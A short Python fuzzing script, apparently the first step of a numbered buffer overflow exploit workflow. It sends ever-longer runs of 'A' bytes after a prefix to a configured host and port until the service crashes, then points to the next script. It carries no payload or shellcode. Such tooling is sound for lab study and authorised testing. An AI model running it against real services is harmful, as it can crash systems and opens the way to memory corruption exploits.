#!/usr/bin/python3
import socket
from details import *

buf = b"A"*100
while True:
    try:
        s = socket.socket()
        s.connect((HOST, PORT))
        initial(s)
        s.send(PREFIX + buf)
        s.close()
        buf = buf + b"A"*100
        print(f"trying {len(buf)} bytes...")
    except:
        print(f"fuzzing crashed at {len(buf)} bytes")
        break

print("Now try a length a bit longer to give some room for your buffer, update the length var in the details, and run ./2test_length.py")
